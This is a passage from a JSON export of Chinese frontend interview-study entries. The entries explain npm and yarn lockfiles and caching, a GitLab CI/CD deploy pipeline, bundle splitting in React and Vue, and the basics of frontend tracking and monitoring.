\"my-app\",\n  \"dependencies\": {\n    \"buffer\": \"^5.4.3\",\n    \"ignore\": \"^5.1.4\",\n    \"base64-js\": \"1.0.1\",\n  }\n}\n\n```\n\n在执行 `npm install` 后生成的 `package-lock.json` 如下：\n\n```\n{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"base64-js\": {\n      \"version\": \"1.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/base64-js/-/base64-js-1.0.1.tgz\",\n      \"integrity\": \"sha1-aSbRsZT7xze47tUTdW3i/Np+pAg=\"\n    },\n    \"buffer\": {\n      \"version\": \"5.4.3\",\n      \"resolved\": \"https://registry.npmjs.org/buffer/-/buffer-5.4.3.tgz\",\n      \"integrity\": \"sha512-zvj65TkFeIt3i6aj5bIvJDzjjQQGs4o/sNoezg1F1kYap9Nu2jcUdpwzRSJTHMMzG0H7bZkn4rNQpImhuxWX2A==\",\n      \"requires\": {\n        \"base64-js\": \"^1.0.2\",\n        \"ieee754\": \"^1.1.4\"\n      },\n      \"dependencies\": {\n        \"base64-js\": {\n          \"version\": \"1.3.1\",\n          \"resolved\": \"https://registry.npmjs.org/base64-js/-/base64-js-1.3.1.tgz\",\n          \"integrity\": \"sha512-mLQ4i2QO1ytvGWFWmcngKO//JXAQueZvwEKtjgQFM4jIK0kU+ytMfplL8j+n5mspOfjHwoAg+9yhb7BwAHm36g==\"\n        }\n      }\n    },\n    \"ieee754\": {\n      \"version\": \"1.1.13\",\n      \"resolved\": \"https://registry.npmjs.org/ieee754/-/ieee754-1.1.13.tgz\",\n      \"integrity\": \"sha512-4vf7I2LYV/HaWerSo3XmlMkp5eZ83i+/CDluXi/IGTs/O1sejBNhTtnxzmRZfvOUqj7lZjqHkeTvpgSFDlWZTg==\"\n    },\n    \"ignore\": {\n      \"version\": \"5.1.4\",\n      \"resolved\": \"https://registry.npmjs.org/ignore/-/ignore-5.1.4.tgz\",\n      \"integrity\": \"sha512-MzbUSahkTW1u7JpKKjY7LCARd1fU5W2rLdxlM4kdkayuCwZImjkpluF9CM1aLewYJguPDqewLam18Y6AU69A8A==\"\n    }\n  }\n}\n\n```\n\n我们来具体看看上面的结构：\n\n![](https://static.ecool.fun//article/35a85171-733a-412d-b2b6-56ccb5ba0bc6.awebp)\n\n最外面的两个属性 `name` 、`version` 同 `package.json` 中的 `name` 和 `version` ，用于描述当前包名称和版本。\n\n`dependencies` 是一个对象，对象和 `node_modules` 中的包结构一一对应，对象的 `key` 为包名称，值为包的一些描述信息：\n\n* `version`：包版本 —— 这个包当前安装在 `node_modules` 中的版本\n* `resolved`：包具体的安装来源\n* `integrity`：包 `hash` 值，基于 `Subresource Integrity` 来验证已安装的软件包是否被改动过、是否已失效\n* `requires`：对应子依赖的依赖，与子依赖的 `package.json` 中 `dependencies`的依赖项相同。\n* `dependencies`：结构和外层的 `dependencies` 结构相同，存储安装在子依赖 `node_modules` 中的依赖包。\n\n这里注意，并不是所有的子依赖都有 `dependencies` 属性，只有子依赖的依赖和当前已安装在根目录的 `node_modules` 中的依赖冲突之后，才会有这个属性。\n\n例如，回顾下上面的依赖关系：\n\n![](https://static.ecool.fun//article/1ddb50e1-afb6-4917-a74d-ff69e5b6c49d.awebp)\n\n我们在 `my-app` 中依赖的 `base64-js@1.0.1` 版本与 `buffer` 中依赖的 `base64-js@^1.0.2` 发生冲突，所以 `base64-js@1.0.1` 需要安装在 `buffer` 包的 `node_modules` 中，对应了 `package-lock.json` 中 `buffer` 的 `dependencies` 属性。这也对应了 `npm` 对依赖的扁平化处理方式。\n\n所以，根据上面的分析， `package-lock.json` 文件 和 `node_modules` 目录结构是一一对应的，即项目目录下存在 `package-lock.json` 可以让每次安装生成的依赖目录结构保持相同。\n\n另外，项目中使用了 `package-lock.json` 可以显著加速依赖安装时间。\n\n我们使用 `npm i --timing=true --loglevel=verbose` 命令可以看到 `npm install` 的完整过程，下面我们来对比下使用 `lock` 文件和不使用 `lock` 文件的差别。在对比前先清理下`npm` 缓存。\n\n不使用 `lock` 文件：\n\n![](https://static.ecool.fun//article/1a0a8179-fc4f-4c24-a28c-5bef6f4714e5.awebp)\n\n使用 `lock` 文件：\n\n![](https://static.ecool.fun//article/31e5aeda-91ac-424c-9773-f4599ae592aa.awebp)\n\n可见， `package-lock.json` 中已经缓存了每个包的具体版本和下载链接，不需要再去远程仓库进行查询，然后直接进入文件完整性校验环节，减少了大量网络请求。\n\n#### 使用建议\n\n开发系统应用时，建议把 `package-lock.json` 文件提交到代码版本仓库，从而保证所有团队开发者以及 `CI` 环节可以在执行 `npm install` 时安装的依赖版本都是一致的。\n\n在开发一个 `npm`包 时，你的 `npm`包 是需要被其他仓库依赖的，由于上面我们讲到的扁平安装机制，如果你锁定了依赖包版本，你的依赖包就不能和其他依赖包共享同一 `semver` 范围内的依赖包，这样会造成不必要的冗余。所以我们不应该把`package-lock.json` 文件发布出去（ `npm` 默认也不会把 `package-lock.json` 文件发布出去）。\n\n### 3.4 缓存\n\n在执行 `npm install` 或 `npm update`命令下载依赖后，除了将依赖包安装在`node_modules` 目录下外，还会在本地的缓存目录缓存一份。\n\n通过 `npm config get cache` 命令可以查询到：在 `Linux` 或 `Mac` 默认是用户主目录下的 `.npm/_cacache` 目录。\n\n在这个目录下又存在两个目录：`content-v2`、`index-v5`，`content-v2` 目录用于存储 `tar`包的缓存，而`index-v5`目录用于存储`tar`包的 `hash`。\n\nnpm 在执行安装时，可以根据 `package-lock.json` 中存储的 `integrity、version、name` 生成一个唯一的 `key` 对应到 `index-v5` 目录下的缓存记录，从而找到 `tar`包的 `hash`，然后根据 `hash` 再去找缓存的 `tar`包直接使用。\n\n我们可以找一个包在缓存目录下搜索测试一下，在 `index-v5` 搜索一下包路径：\n\n```\ngrep \"https://registry.npmjs.org/base64-js/-/base64-js-1.0.1.tgz\" -r index-v5\n\n```\n\n![](https://static.ecool.fun//article/e0c499b8-a070-4214-8360-0b060fb6f5cd.awebp)\n\n然后我们将json格式化：\n\n```\n{\n  \"key\": \"pacote:version-manifest:https://registry.npmjs.org/base64-js/-/base64-js-1.0.1.tgz:sha1-aSbRsZT7xze47tUTdW3i/Np+pAg=\",\n  \"integrity\": \"sha512-C2EkHXwXvLsbrucJTRS3xFHv7Mf/y9klmKDxPTE8yevCoH5h8Ae69Y+/lP+ahpW91crnzgO78elOk2E6APJfIQ==\",\n  \"time\": 1575554308857,\n  \"size\": 1,\n  \"metadata\": {\n    \"id\": \"base64-js@1.0.1\",\n    \"manifest\": {\n      \"name\": \"base64-js\",\n      \"version\": \"1.0.1\",\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      },\n      \"dependencies\": {},\n      \"optionalDependencies\": {},\n      \"devDependencies\": {\n        \"standard\": \"^5.2.2\",\n        \"tape\": \"4.x\"\n      },\n      \"bundleDependencies\": false,\n      \"peerDependencies\": {},\n      \"deprecated\": false,\n      \"_resolved\": \"https://registry.npmjs.org/base64-js/-/base64-js-1.0.1.tgz\",\n      \"_integrity\": \"sha1-aSbRsZT7xze47tUTdW3i/Np+pAg=\",\n      \"_shasum\": \"6926d1b194fbc737b8eed513756de2fcda7ea408\",\n      \"_shrinkwrap\": null,\n      \"bin\": null,\n      \"_id\": \"base64-js@1.0.1\"\n    },\n    \"type\": \"finalized-manifest\"\n  }\n}\n\n```\n\n上面的 `_shasum` 属性 `6926d1b194fbc737b8eed513756de2fcda7ea408` 即为 `tar` 包的 `hash`， `hash`的前几位 `6926` 即为缓存的前两层目录，我们进去这个目录果然找到的压缩后的依赖包：\n\n![](https://static.ecool.fun//article/90c8bacd-f403-4b7b-98b9-7bf5719aef3b.awebp)\n\n> 以上的缓存策略是从 npm v5 版本开始的，在 npm v5 版本之前，每个缓存的模块在 ~/.npm 文件夹中以模块名的形式直接存储，储存结构是{cache}/{name}/{version}。\n\n`npm` 提供了几个命令来管理缓存数据：\n\n* `npm cache add`：官方解释说这个命令主要是 `npm` 内部使用，但是也可以用来手动给一个指定的 package 添加缓存。\n* `npm cache clean`：删除缓存目录下的所有数据，为了保证缓存数据的完整性，需要加上 `--force` 参数。\n* `npm cache verify`：验证缓存数据的有效性和完整性，清理垃圾数据。\n\n基于缓存数据，npm 提供了离线安装模式，分别有以下几种：\n\n* `--prefer-offline`： 优先使用缓存数据，如果没有匹配的缓存数据，则从远程仓库下载。\n* `--prefer-online`： 优先使用网络数据，如果网络数据请求失败，再去请求缓存数据，这种模式可以及时获取最新的模块。\n* `--offline`： 不请求网络，直接使用缓存数据，一旦缓存数据不存在，则安装失败。\n\n### 3.5 文件完整性\n\n上面我们多次提到了文件完整性，那么什么是文件完整性校验呢？\n\n在下载依赖包之前，我们一般就能拿到 `npm` 对该依赖包计算的 `hash` 值，例如我们执行 `npm info` 命令，紧跟 `tarball`(下载链接) 的就是 `shasum`(`hash`) ：\n\n![](https://static.ecool.fun//article/b195153f-1643-4a5f-8ff4-c328a6580b9b.awebp)\n\n用户下载依赖包到本地后，需要确定在下载过程中没有出现错误，所以在下载完成之后需要在本地在计算一次文件的 `hash` 值，如果两个 `hash` 值是相同的，则确保下载的依赖是完整的，如果不同，则进行重新下载。\n\n### 3.6 整体流程\n\n好了，我们再来整体总结下上面的流程：\n\n* 检查 `.npmrc` 文件：优先级为：项目级的 `.npmrc` 文件 > 用户级的 `.npmrc` 文件> 全局级的 `.npmrc` 文件 > npm 内置的 `.npmrc` 文件\n* 检查项目中有无 `lock` 文件。\n* 无 `lock` 文件：\n\n  + 从 `npm` 远程仓库获取包信息\n  + 根据 `package.json` 构建依赖树，构建过程：\n    - 构建依赖树时，不管其是直接依赖还是子依赖的依赖，优先将其放置在 `node_modules` 根目录。\n    - 当遇到相同模块时，判断已放置在依赖树的模块版本是否符合新模块的版本范围，如果符合则跳过，不符合则在当前模块的 `node_modules` 下放置该模块。\n    - 注意这一步只是确定逻辑上的依赖树，并非真正的安装，后面会根据这个依赖结构去下载或拿到缓存中的依赖包\n  + 在缓存中依次查找依赖树中的每个包\n    - 不存在缓存：\n      * 从 `npm` 远程仓库下载包\n      * 校验包的完整性\n      * 校验不通过：\n        + 重新下载\n      * 校验通过：\n        + 将下载的包复制到 `npm` 缓存目录\n        + 将下载的包按照依赖结构解压到 `node_modules`\n    - 存在缓存：将缓存按照依赖结构解压到 `node_modules`\n  + 将包解压到 `node_modules`\n  + 生成 `lock` 文件\n* 有 `lock` 文件：\n\n  + 检查 `package.json` 中的依赖版本是否和 `package-lock.json` 中的依赖有冲突。\n  + 如果没有冲突，直接跳过获取包信息、构建依赖树过程，开始在缓存中查找包信息，后续过程相同\n\n![](https://static.ecool.fun//article/30cf3b7e-6451-4db4-a38f-72e562e596e4.awebp)\n\n上面的过程简要描述了 `npm install` 的大概过程，这个过程还包含了一些其他的操作，例如执行你定义的一些生命周期函数，你可以执行 `npm install package --timing=true --loglevel=verbose` 来查看某个包具体的安装流程和细节。\n\n### 3.7 yarn\n\n![](https://static.ecool.fun//article/fc18a7af-7c27-486e-ba0e-9d7afc301328.awebp)\n\n`yarn` 是在 `2016` 年发布的，那时 `npm` 还处于 `V3` 时期，那时候还没有 `package-lock.json` 文件，就像上面我们提到的：不稳定性、安装速度慢等缺点经常会受到广大开发者吐槽。此时，`yarn` 诞生：\n\n![](https://static.ecool.fun//article/5f6d8b5d-8a22-497b-b319-1251b2f85a16.awebp)\n\n上面是官网提到的 `yarn` 的优点，在那个时候还是非常吸引人的。当然，后来 `npm` 也意识到了自己的问题，进行了很多次优化，在后面的优化（`lock`文件、缓存、默认-s...）中，我们多多少少能看到 `yarn` 的影子，可见 `yarn` 的设计还是非常优秀的。\n\n`yarn` 也是采用的是 `npm v3` 的扁平结构来管理依赖，安装依赖后默认会生成一个 `yarn.lock` 文件，还是上面的依赖关系，我们看看 `yarn.lock` 的结构：\n\n```\n# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.\n# yarn lockfile v1\n\nbase64-js@1.0.1:\n  version \"1.0.1\"\n  resolved \"https://registry.yarnpkg.com/base64-js/-/base64-js-1.0.1.tgz#6926d1b194fbc737b8eed513756de2fcda7ea408\"\n  integrity sha1-aSbRsZT7xze47tUTdW3i/Np+pAg=\n\nbase64-js@^1.0.2:\n  version \"1.3.1\"\n  resolved \"https://registry.yarnpkg.com/base64-js/-/base64-js-1.3.1.tgz#58ece8cb75dd07e71ed08c736abc5fac4dbf8df1\"\n  integrity sha512-mLQ4i2QO1ytvGWFWmcngKO//JXAQueZvwEKtjgQFM4jIK0kU+ytMfplL8j+n5mspOfjHwoAg+9yhb7BwAHm36g==\n\nbuffer@^5.4.3:\n  version \"5.4.3\"\n  resolved \"https://registry.yarnpkg.com/buffer/-/buffer-5.4.3.tgz#3fbc9c69eb713d323e3fc1a895eee0710c072115\"\n  integrity sha512-zvj65TkFeIt3i6aj5bIvJDzjjQQGs4o/sNoezg1F1kYap9Nu2jcUdpwzRSJTHMMzG0H7bZkn4rNQpImhuxWX2A==\n  dependencies:\n    base64-js \"^1.0.2\"\n    ieee754 \"^1.1.4\"\n\nieee754@^1.1.4:\n  version \"1.1.13\"\n  resolved \"https://registry.yarnpkg.com/ieee754/-/ieee754-1.1.13.tgz#ec168558e95aa181fd87d37f55c32bbcb6708b84\"\n  integrity sha512-4vf7I2LYV/HaWerSo3XmlMkp5eZ83i+/CDluXi/IGTs/O1sejBNhTtnxzmRZfvOUqj7lZjqHkeTvpgSFDlWZTg==\n\nignore@^5.1.4:\n  version \"5.1.4\"\n  resolved \"https://registry.yarnpkg.com/ignore/-/ignore-5.1.4.tgz#84b7b3dbe64552b6ef0eca99f6743dbec6d97adf\"\n  integrity sha512-MzbUSahkTW1u7JpKKjY7LCARd1fU5W2rLdxlM4kdkayuCwZImjkpluF9CM1aLewYJguPDqewLam18Y6AU69A8A==\n\n```\n\n可见其和 `package-lock.json` 文件还是比较类似的，还有一些区别就是：\n\n* `package-lock.json` 使用的是 `json` 格式，`yarn.lock` 使用的是一种自定义格式\n* `yarn.lock` 中子依赖的版本号不是固定的，意味着单独又一个 `yarn.lock` 确定不了 `node_modules` 目录结构，还需要和 `package.json` 文件进行配合。而 `package-lock.json` 只需要一个文件即可确定。\n\n`yarn` 的缓策略看起来和 `npm v5` 之前的很像，每个缓存的模块被存放在独立的文件夹，文件夹名称包含了模块名称、版本号等信息。使用命令 `yarn cache dir` 可以查看缓存数据的目录：\n\n![](https://static.ecool.fun//article/09b4ff18-40ca-4c25-bb12-36f34cea9c54.awebp)\n\n> `yarn` 默认使用 `prefer-online` 模式，即优先使用网络数据，如果网络数据请求失败，再去请求缓存数据。\n",
    "testPoint": "1. 工具：npm、yarn、pnpm；pnpm 用硬链+内容寻址，磁盘省 50%、装包快 2-3 倍。  \n2. 锁文件：package-lock.json / yarn.lock / pnpm-lock.yaml 保证版本一致性。  \n3. Monorepo：pnpm workspace / Nx / TurboRepo 统一依赖、并行构建、缓存命中。  \n",
    "exerciseKeyList": "[\"db24eaf9-ddf2-476b-ba63-03b7520cdaca\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-08-07T02:55:26.000Z",
    "updateAt": "2025-10-23T08:29:06.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "db24eaf9-ddf2-476b-ba63-03b7520cdaca",
        "title": "说说你对 npm 包管理的了解",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T19:03:40.000Z"
      }
    ]
  },
  "266": {
    "id": 266,
    "tagId": 28,
    "title": "持续集成/持续部署（CI/CD）",
    "explanation": "## 传统应用发布模式\n\n**开发人员**：在开发环境完成代码编写，单元测试，测试通过后提交到代码仓库\n\n**运维人员**：把项目部署到测试环境，供QA团队测试，测试通过后，部署生成环境\n\n**测试人员**：进行测试，测试完成后通知运维部署生产环境\n\n### 缺点\n\n1. 项目在早期就存在错误，但到最后集成的时候才发现\n2. 需要手动操作，易错率高\n3. 开发与运维需要及时沟通\n   有了以上缺点，那么就有了CI/CD\n\n## CI/CD\n\n*持续集成*(CI):\n\n1. 合并开发人员正在编写的所有代码\n2. 一天内进行多次合并和提交代码\n3. 从存储库或生产环境中进行构建和自动化测试，确保没有集成问题并及早发现任何问题\n\n*持续交付*(CD):\n\n1. 可以通过将更改自动推送到发布系统来随时将软件发布到生产环境中\n2. 持续部署，并自动将更改推送到生产中\n\n## GitLab内置CI/CD\n\n### 运行流水线任务\n\nJob\n\n在文件中可以定义一个或多个作业，每个作业具有唯一的名称，每个作业是独立执行的，*每个作业至少包含一个script*\n\nstages：\n\n用于定义作业可以使用的阶段，并且是全局定义，同一个阶段的作业并行运行，不同阶段按顺序运行\n\nonly：\n\n用分支策略来限制jobs构建\n\nscript:\n\n项目中package中的脚本\n\nenvironment：\n\n定义此作业完成部署的环境名称\n\n下面是每个jobs的详细变量名\n\n| Keyword | Required | Description |\n| --- | --- | --- |\n| script | yes | Runner执行的命令或脚本 |\n| image | no | 所使用的docker镜像，查阅[使用docker镜像](https://docs.gitlab.com/ce/ci/docker/using_docker_images.html#define-image-and-services-from-gitlab-ciyml) |\n| services | no | 所使用的docker服务，查阅[使用docker镜像](https://docs.gitlab.com/ce/ci/docker/using_docker_images.html#define-image-and-services-from-gitlab-ciyml) |\n| stage | no | 定义job stage（默认：`test`） |\n| type | no | `stage`的别名（已弃用） |\n| variables | no | 定义job级别的变量 |\n| only | no | 定义一列git分支，并为其创建job |\n| except | no | 定义一列git分支，不创建job |\n| tags | no | 定义一列tags，用来指定选择哪个Runner（同时Runner也要设置tags） |\n| allow\\_failure | no | 允许job失败。失败的job不影响commit状态 |\n| when | no | 定义何时开始job。可以是`on_success`，`on_failure`，`always`或者`manual` |\n| dependencies | no | 定义job依赖关系，这样他们就可以互相传递artifacts |\n| cache | no | 定义应在后续运行之间缓存的文件列表 |\n| before\\_script | no | 重写一组在作业前执行的命令 |\n| after\\_script | no | 重写一组在作业后执行的命令 |\n| environment | no | 定义此作业完成部署的环境名称 |\n| coverage | no | 定义给定作业的代码覆盖率设置 |\n\n### 配置.gitlab-ci.yml\n\n```\nstages:\n  - deploy_dev\n  - deploy_test\n  - deploy_production\n\ndeploy_dev:\n  stage: deploy_dev\n  environment:\n    name: dev\n  only:\n    - dev\n  script:\n    - rsync -av . ${WORKSPACE_PATH} && cd ${WORKSPACE_PATH}\n    - npm run build:dev\n    - ansible-playbook ansible-deploy.yml --extra-vars \"hosts=cloud_ui_test projectDir=${WORKSPACE_DIST_PATH} projectName=${PROJECT_NAME} webRootPath=/opt/devroot/\"\n\ndeploy_test:\n  stage: deploy_test\n  environment:\n    name: test\n  only:\n    - master\n  script:\n    - rsync -av . ${WORKSPACE_PATH} && cd ${WORKSPACE_PATH}\n    - npm run build:stage\n    - ansible-playbook ansible-deploy.yml --extra-vars \"hosts=cloud_ui_test projectDir=${WORKSPACE_DIST_PATH} projectName=${PROJECT_NAME} webRootPath=${WEB_ROOT_PATH}\"\n\ndeploy_production:\n  stage: deploy_production\n  only:\n    - production\n  when: manual\n  script:\n    - npm install\n    - npm run build:prod\n    - ansible-playbook ansible-deploy.yml --extra-vars \"hosts=dvs-front-prod projectDir=${PROJECT_PATH} projectName=xianglin-cloud-ui/${PROJECT_NAME} webRootPath=/opt/\"\n\n```\n\n上面这个.yml文件,我们首先定义了三个阶段，deploy\\_dev部署到dev环境，并且拉去的是dev分支代码; deploy\\_test部署到test环境，拉去的是master分支代码，deploy\\_production拉取production分支代码，执行完后需要手动操作\n\n![QQ截图20220925162250.jpg](https://static.ecool.fun//article/20043747-2476-46c0-b227-c9dda063d141.awebp)\n\n### 构建流程\n\n![QQ截图20220925163321.jpg](https://static.ecool.fun//article/8d9a6c8a-ecc4-4609-be5a-145aa49b12fa.awebp)\n执行成功后部署到服务器\n",
    "testPoint": "\n1. 触发：push / PR → GitHub Actions / GitLab CI / Jenkins 自动拉起流水线。  \n2. 流程：安装依赖 → lint → test → build → 上传产物 → 部署。  \n3. 产物：dist 包打 zip / Docker 镜像，版本号由 changesets 自动生成。  \n4. 部署：  \n   - 静态：CI 里 `rsync` / `aws s3 sync` 到 CDN；  \n   - 容器：`docker build` → 推送仓库 → K8s 滚动更新。  \n5. 回滚：保留最近 N 个版本，一键 revert；监控告警异常自动触发回滚脚本。",
    "exerciseKeyList": "[\"c7505e46-4e58-4d34-b27d-b022c244cfad\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-08-07T02:57:47.000Z",
    "updateAt": "2025-10-23T08:29:53.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "c7505e46-4e58-4d34-b27d-b022c244cfad",
        "title": "什么是 CI/CD？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-12-30T01:40:45.000Z",
        "updateAt": "2024-08-10T17:07:07.000Z"
      }
    ]
  },
  "269": {
    "id": 269,
    "tagId": 28,
    "title": "代码分割工程化",
    "explanation": "# 什么是 Bundle Splitting？\n\nBundle Splitting（代码分割）是一种将前端资源拆分成更小、独立的模块的技术。传统上，前端资源（如 JavaScript、CSS 和图片等）被打包成单个文件，通常称为“bundle”。这种方式存在一个问题，即无论用户需要哪些功能，都必须下载整个 bundle。而 Bundle Splitting 技术通过将代码拆分为更小的模块，按需加载，可以有效解决这个问题。\n\n# Bundle Splitting 的优点\n\n1. 减少初始加载时间\n   通过将代码拆分为多个小块，可以减少初始加载时间。当用户首次访问网页时，只需下载当前页面所需的资源，而无需等待整个应用程序的加载完成。这可以极大地提高页面的响应速度，并减少用户的等待时间。\n2. 提升用户体验\n   通过将代码分割成模块，可以使应用程序更具响应性。当用户与应用进行交互时，只需加载所需的代码块，而不是整个应用。这将减少不必要的资源消耗，并使用户感觉应用更加流畅和快速。\n3. 优化缓存策略\n   拆分代码还能优化缓存策略。当应用程序发生更改时，只需重新加载发生变化的模块，而不必重新下载整个应用。这减少了不必要的网络请求，提高了应用的更新效率，并减轻了服务器的负载。\n4. 并行加载资源\n   通过将代码拆分为多个模块，可以实现并行加载资源。浏览器能够同时下载多个文件，从而减少整体加载时间。这对于大型应用程序和复杂的前端框架特别有益，能够更好地利用浏览器的并行下载能力，提高资源的加载效率。\n5. 代码复用和维护\n   通过将代码分割成模块，可以更好地实现代码的复用和维护。不同的模块可以根据需求进行加载和升级，使得代码结构更加清晰、模块化。这也有助于团队合作，不同开发者可以并行工作在不同的模块上，提高开发效率和代码质量。\n\n# Bundle Splitting 的缺点\n\n1. 增加了网络请求\n   拆分代码会增加应用程序的网络请求次数。每个模块都需要进行一次独立的网络请求，这可能会导致一些额外的延迟和性能损失。在网络条件较差的情况下，这可能会对用户体验产生一定影响。\n2. 增加了开发复杂性\n   使用 Bundle Splitting 技术需要对应用程序的依赖关系进行深入分析和管理。开发人员需要仔细考虑代码的拆分点，以及如何在运行时动态加载模块。这增加了开发复杂性，并要求开发人员具备较高的技术水平和经验。\n3. 潜在的代码冗余\n   当模块之间存在共享的代码片段时，可能会出现潜在的代码冗余问题。如果不合理地进行代码拆分，可能会导致多个模块中存在相同的代码，增加了资源的下载和维护成本。因此，在进行代码拆分时，需要仔细考虑代码复用和代码冗余的问题。\n4. 需要额外的工具和配置\n   Bundle Splitting 需要使用额外的工具和配置来实现代码的拆分和动态加载。这可能需要对构建工具进行配置，如 Webpack、Rollup 等，以及对模块加载器进行调整。这增加了一些学习成本和开发成本，尤其是对于新手来说。\n\n# Bundle Splitting 的适用场景\n\nBundle Splitting 技术适用于大型的 Web 应用程序，特别是那些具有复杂功能和大量依赖的应用。以下是一些适合使用 Bundle Splitting 的场景：\n\n* 大型单页应用：对于由多个模块组成的单页应用，使用 Bundle Splitting 可以提高初始加载速度，提升用户体验。\n* 按需加载：对于需要动态加载不同功能模块的应用，Bundle Splitting 可以根据用户的需求按需加载模块，减少不必要的资源消耗。\n* 公共库和框架：对于使用公共库或框架的应用，可以将这些库和框架拆分成单独的模块，以便在多个页面中共享和复用。\n* 国际化支持：对于需要支持多种语言的应用，可以将不同语言的资源文件拆分成独立的模块，根据用户的语言偏好进行加载。\n* 代码分支管理：对于大型团队开发的项目，使用 Bundle Splitting 可以更好地实现代码的分支管理和并行开发，提高开发效率。\n\n# Bundle Splitting 在知名项目中的应用\n\n## 示例 1：React.lazy 和 Suspense\n\nReact.js 是一个广泛使用的 JavaScript 库，用于构建用户界面。React 提供了 React.lazy 和 Suspense API 来实现 Bundle Splitting。\n\n```\n\nimport React, {\n    lazy, Suspense } from 'react';\n\nconst MyComponent = lazy(() => import('./MyComponent'));\n\nfunction App() {\n\n  return (\n    <div>\n      <Suspense fallback={\n   <div>Loading...</div>}>\n        <MyComponent />\n      </Suspense>\n    </div>\n  );\n}\n\n```\n\n在上面的示例中，MyComponent 被拆分为一个独立的模块，并且只有在需要时才会被加载。使用 React.lazy 和 Suspense，我们可以实现按需加载 React 组件，提高应用的性能和加载速度。\n\n## 示例 2：Vue.js 的异步组件\n\nVue.js 是另一个流行的 JavaScript 框架，用于构建用户界面。Vue 提供了异步组件的功能，以支持 Bundle Splitting。\n\n```\n\n<template>\n  <div>\n    <AsyncComponent />\n  </div>\n</template>\n\n<script>\nexport default {\n\n  components: {\n\n    AsyncComponent: () => import('./AsyncComponent')\n  }\n}\n</script>\n\n```\n\n在上面的示例中，AsyncComponent 被拆分成一个异步组件，并且只有在需要时才会被加载。这样可以减少初始加载时间，并提高应用的性能。\n\n# 结论\n\nBundle Splitting 是一项强大的前端技术，通过拆分前端资源并按需加载，可以显著提升应用程序的性能和用户体验。尽管 Bundle Splitting 存在一些缺点，如增加网络请求和开发复杂性，但它在大型项目中的应用和适用场景中显示出了巨大的优势。通过合理使用 Bundle Splitting 技术，开发人员可以更好地优化前端性能，并提供高效、响应式的 Web 应用程序。",
    "testPoint": "\n1. 依据：路由/组件/第三方库/动态业务 → 按需拆 chunk。  \n2. 工具：Webpack `SplitChunks` / Vite `manualChunks` / Rollup `output.manualChunks`。  \n3. 路由级：React.lazy + React-Router `lazy(() => import())`，Vue 用 `defineAsyncComponent`。  \n4. 组件级：动态 `import()` + `IntersectionObserver` / `onClick` 触发。  \n5. 监控：Webpack-bundle-analyzer 看体积，Sentry/Grafana 看首屏 & 懒加载成功率。",
    "exerciseKeyList": "[\"eafdce6d-b42c-42b1-bfb5-f40947e6f5d8\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2025-08-07T03:00:57.000Z",
    "updateAt": "2025-10-23T08:30:07.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "eafdce6d-b42c-42b1-bfb5-f40947e6f5d8",
        "title": "在 React 中如何实现代码分割？有哪些常见方式？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2025-03-20T01:33:38.000Z",
        "updateAt": "2025-03-20T01:33:42.000Z"
      }
    ]
  },
  "270": {
    "id": 270,
    "tagId": 28,
    "title": "前端性能监控",
    "explanation": "## 大纲\n\n我们会从以下三个方向来讲解埋点与监控的知识：\n\n-   什么是埋点？什么是监控？\n-   JS 中实现监控的核心方案\n-   写一个“相对”完整的监控实例\n\n## 一、什么是埋点？什么是监控？\n\n在日常沟通中，我们经常会把【埋点】和【监控】放到一起说，但是它们在本质上是有一定的区别的：\n\n### 1\\. 埋点\n\n埋点主要用于**收集用户行为数据**。在日常开发中，我们会通过 **在前端代码中插入代码或脚本的方式** 来实现埋点功能。\n\n埋点的主要作用就是：**捕获特定用户行为（如点击、浏览、提交表单、页面跳转等）以及关键业务数据（如下单金额、商品类别等）**\n\n在日常开发中，埋点的实现方案大致可以分为以下三大类：\n\n-   **手动埋点**：在代码中手动加入记录代码来捕获特定事件。\n-   **自动埋点**：利用 DOM 事件代理等技术来捕获页面上所有事件，从而减少手动配置。\n-   **可视化埋点**：通过工具界面标记需要采集的元素和事件，可以不用手写代码。\n\n### 2\\. 监控\n\n而监控则主要关注 **系统的性能和稳定性**。在日常开发中，我们会通过 **采集页面加载时间、资源请求、错误日志等数据** 的方式来实现前端监控。\n\n监控的主要作用就是：**及时发现并定位页面性能瓶颈或代码异常，目的是为了保障系统不出 bug**\n\n在日常开发中，监控一般需要完成以下三大部分：\n\n-   **性能监控**：如：首屏加载时间、页面交互耗时、资源加载耗时等。\n-   **错误监控**：捕获 JavaScript 错误、网络请求失败、资源加载异常等。\n-   **用户体验监控**：收集白屏、卡顿等影响用户体验的问题等。\n\n### 区别总结\n\n| 维度 | 前端埋点 | 前端监控 |\n| --- | --- | --- |\n| 目标 | 捕获用户行为数据 | 监控系统性能、错误、稳定性 |\n| 数据类型 | 用户点击、表单提交、页面跳转等 | 页面加载时间、错误日志、卡顿情况等 |\n| 实现方式 | 手动埋点、自动埋点、可视化埋点 | 错误捕获、性能指标采集 |\n| 核心关注点 | 用户行为、业务数据 | 系统Bug、性能优化 |\n\n## 二、JS 中实现监控的核心方案\n\n根据上面所说，我们知道埋点和监控的目的存在不同，但是它们的思路确是有很多一致性的，其核心都是：**获取关键的数据，发送（上报）给服务端**，依据数据来解决其不同的目的。\n\n所以，无论是埋点也好，还是监控也罢，我们都需要 **获取关键位置数据**。\n\n### 1\\. 跟踪用户事件（点击、滚动等）\n\n**定义通用跟踪函数（后续事件会通过该函数完成上报）**：`trackEvent` 函数接收事件类型和事件详情，并上报到服务端。\n\n```js\n// 用于记录或发送跟踪数据到服务器的函数\nfunction trackEvent(eventType, details) {\n    console.log(`Event: ${eventType}`, details); // 在控制台打印事件类型和详情\n    // 上报到服务端。\n    fetch('/测试接口地址', { method: 'POST', body: JSON.stringify({ eventType, details }) });\n}\n```\n\n**捕获按钮点击事件**：获取 `id` 为 `myButton` 